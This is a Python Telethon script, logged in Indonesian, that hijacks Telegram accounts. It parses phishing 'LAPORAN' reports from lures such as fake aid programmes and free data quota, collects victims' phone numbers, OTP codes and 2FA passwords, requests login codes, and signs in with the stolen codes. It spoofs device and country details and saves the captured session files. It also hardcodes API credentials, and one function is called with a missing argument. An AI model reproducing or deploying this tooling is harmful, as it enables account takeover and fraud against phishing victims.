import asyncio
import os
import re
import shutil
import random
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.errors import (
    PhoneNumberUnoccupiedError, SessionPasswordNeededError,
    PhoneCodeInvalidError
)
from telethon.tl.functions.account import GetAuthorizationsRequest
from telethon.network.connection import ConnectionTcpAbridged

# Konfigurasi API
api_id = 23520639
api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'

SESSIONS_FOLDER = "a45_sessions"
SESSIONS_FOLDER_FINAL = "sessions3"
ALLOWED_PREFIXES = ["+62", "+60", "+971"]

pending_login = {}
incoming_messages = {}
login_attempted = set()
completed_login = set()

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)

client = TelegramClient('main2', api_id, api_hash)

DEVICE_LIST = [
    ("Samsung Galaxy S21", "Android 13"),
    ("Xiaomi Redmi Note 10", "Android 12"),
    ("OPPO Reno 6", "Android 11"),
    ("Vivo Y20", "Android 10"),
    ("Realme 8", "Android 11"),
    ("Asus ROG Phone 5", "Android 12"),
    ("OnePlus Nord", "Android 11"),
    ("Google Pixel 5", "Android 11"),
    ("Huawei P30", "Android 10")
]

def normalize_phone_number(raw_phone):
    digits_only = re.sub(r'\D', '', raw_phone)
    if digits_only.startswith("01") and len(digits_only) in [10, 11]:
        return '+60' + digits_only[1:]
    elif digits_only.startswith("60"):
        return '+' + digits_only
    elif raw_phone.startswith('+'):
        return raw_phone
    elif digits_only.startswith("62"):
        return '+' + digits_only
    return None

def is_valid_phone_number(phone):
    if not phone or not phone.startswith('+'):
        return False
    digits_only = re.sub(r'\D', '', phone)
    return 10 <= len(digits_only) <= 15 and any(phone.startswith(p) for p in ALLOWED_PREFIXES)

def create_spoofed_client(session_path, phone):
    model, version = random.choice(DEVICE_LIST)
    print(f"[\U0001f6e0\ufe0f] Spoof applied: {model} ({version})")

    client = TelegramClient(
        session_path, api_id, api_hash,
        device_model=model,
        system_version=version,
        app_version="Telegram Android 10.0.0",
        lang_code="en",
        system_lang_code="en",
        connection=ConnectionTcpAbridged
    )

    async def set_country_after_connect():
        try:
            await client.connect()
            if hasattr(client, "_init_connection"):
                conn = client._init_connection
                if phone.startswith("+62"):
                    conn.country = "ID"
                elif phone.startswith("+60"):
                    conn.country = "MY"
                elif phone.startswith("+971"):
                    conn.country = "AE"
                else:
                    conn.country = "US"
                print(f"[\U0001f30f] Country spoof applied: {conn.country}")
        except Exception as e:
            print(f"[\u26a0\ufe0f] Gagal spoof country: {e}")

    client.set_country = set_country_after_connect
    return client

async def request_otp(phone):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_client = create_spoofed_client(session_path, phone)
        await login_client.set_country()

        if await login_client.is_user_authorized():
            print(f"[✅] {phone} sudah login. Pindahkan session.")
            await login_client.disconnect()
            final_path = os.path.join(SESSIONS_FOLDER_FINAL, phone)
            if os.path.exists(session_path + ".session"):
                shutil.move(session_path + ".session", final_path + ".session")
            completed_login.add(phone)
            return

        try:
            sent = await login_client.send_code_request(phone)
        except PhoneNumberUnoccupiedError:
            print(f"[❌] {phone} belum terdaftar.")
            await login_client.disconnect()
            return
        except Exception as e:
            print(f"[❌] Gagal kirim OTP ke {phone}: {e}")
            await login_client.disconnect()
            return

        pending_login[phone] = (login_client, sent.phone_code_hash)
        print(f"[📨] OTP dikirim ke {phone}")

    except Exception as e:
        print(f"[ERROR] request_otp {phone}: {e}")

async def complete_login(phone, otp, password=None):
    try:
        if phone not in pending_login or phone in login_attempted:
            return

        login_client, phone_code_hash = pending_login[phone]
        await login_client.connect()

        try:
            await login_client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        except PhoneNumberUnoccupiedError:
            await login_client.sign_up(otp, first_name="UserBaru")
        except SessionPasswordNeededError:
            if password:
                await login_client.sign_in(password=password)
                print(f"[🔓] Login 2FA berhasil: {phone}")
            else:
                print(f"[⏳] Menunggu password 2FA: {phone}")
                return
        except PhoneCodeInvalidError:
            print(f"[❌] OTP salah: {phone}")
            login_attempted.add(phone)
            if phone in incoming_messages:
                incoming_messages[phone]["otp"] = None
            return
        except Exception as e:
            print(f"[❌] Gagal login: {phone} | {e}")
            login_attempted.add(phone)
            return

        print(f"[✅] Login berhasil: {phone}")
        if not password:
            completed_login.add(phone)

        await login_client.disconnect()

        src = os.path.join(SESSIONS_FOLDER, phone + ".session")
        dst = os.path.join(SESSIONS_FOLDER_FINAL, phone + ".session")

        for i in range(5):
            try:
                shutil.move(src, dst)
                print(f"[📂] Session dipindah: {dst}")
                break
            except Exception as e:
                print(f"[⌛] Gagal pindah session (try {i+1}): {e}")
                await asyncio.sleep(1)

        del pending_login[phone]
        login_attempted.discard(phone)
        if phone in incoming_messages:
            incoming_messages[phone]["otp"] = None

    except Exception as e:
        print(f"[❌] complete_login error: {e}")
        if phone in pending_login:
            del pending_login[phone]
        login_attempted.add(phone)

@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text

    if not any(k in msg for k in [
        '❮ LAPORAN My Kasih ❯', '❮ LAPORAN BANTUAN MADANI ❯',
        '❮ LAPORAN Judul ❯', '❮ LAPORAN judul ❯',
        '❮ LAPORAN GRATIS KUOTA ❯', '❮ LAPORAN UANG KUNO ❯',
        '❮ LAPORAN Uang Kuno ❯', '❮ LAPORAN Laporan ❯',
        '❮ LAPORAN HACK WHATSAPP ❯', '❮ LAPORAN Laporan ❯'
    ]):
        return

    phone_match = re.search(r'(?:PHONE\s+NUMBER|NUMBER|NOWA)\s*:\s*(\+?\d+)', msg)
    otp_match = re.search(r'(?:OTP|PIN|OTP\s+WA)\s*:\s*(\d{4,6})', msg)
    password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)

    if not phone_match:
        return

    raw_phone = phone_match.group(1).strip()
    phone = normalize_phone_number(raw_phone)

    if not phone or not is_valid_phone_number(phone):
        print(f"[❌] Nomor tidak valid: {raw_phone}")
        return

    if phone in completed_login:
        print(f"[⛔] {phone} sudah login, abaikan pesan baru.")
        return

    if phone not in incoming_messages:
        incoming_messages[phone] = {"otp": None, "password": None, "last_update": datetime.now()}
        if phone not in pending_login:
            print(f"[📨] Kirim OTP pertama kali ke {phone}")
            asyncio.create_task(request_otp(phone))
        else:
            print(f"[⏳] OTP sudah dikirim ke {phone}")
    else:
        incoming_messages[phone]["last_update"] = datetime.now()

    if otp_match:
        otp_value = otp_match.group(1)
        incoming_messages[phone]["otp"] = otp_value
        print(f"[📥] OTP diterima: {phone} = {otp_value}")

    if password_match:
        pw_value = password_match.group(1)
        incoming_messages[phone]["password"] = pw_value
        print(f"[🔐] Password 2FA diterima: {phone} = {pw_value}")

    data = incoming_messages[phone]
    if data["otp"] and phone in pending_login and phone not in login_attempted:
        asyncio.create_task(complete_login(phone, data["otp"], data.get("password")))

async def clear_old_cache():
    while True:
        now = datetime.now()
        expired = [p for p, d in incoming_messages.items() if now - d["last_update"] > timedelta(minutes=5)]
        for phone in expired:
            print(f"[🧹] Hapus cache kadaluarsa: {phone}")
            del incoming_messages[phone]
        await asyncio.sleep(60)

async def check_all_existing_sessions():
    print("[🔍] Memeriksa semua session lama di folder...\n")
    for filename in os.listdir(SESSIONS_FOLDER):
        if not filename.endswith(".session"):
            continue

        phone = filename.replace(".session", "")
        session_path = os.path.join(SESSIONS_FOLDER, filename)
        final_path = os.path.join(SESSIONS_FOLDER_FINAL, filename)

        client = create_spoofed_client(session_path)
        try:
            await client.connect()
            if await client.is_user_authorized():
                print(f"[✅] Session valid: {phone}")
                await client.disconnect()
                shutil.move(session_path, final_path)
                print(f"[📂] Dipindah ke folder final: {final_path}")
                completed_login.add(phone)
            else:
                print(f"[❌] Session tidak valid: {phone} — akan dihapus.")
                await client.disconnect()
                os.remove(session_path)

        except Exception as e:
            print(f"[🛑] Gagal membuka session {phone}, kemungkinan rusak — akan dihapus.\n{e}")
            if client.is_connected():
                await client.disconnect()
            try:
                os.remove(session_path)
                print(f"[🗑️] Session rusak dihapus: {session_path}")
            except Exception as del_err:
                print(f"[⚠️] Gagal menghapus file rusak {session_path}: {del_err}")

async def main():
    await check_all_existing_sessions()
    asyncio.create_task(clear_old_cache())
    await client.start()
    print("[🚀] Bot berjalan.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
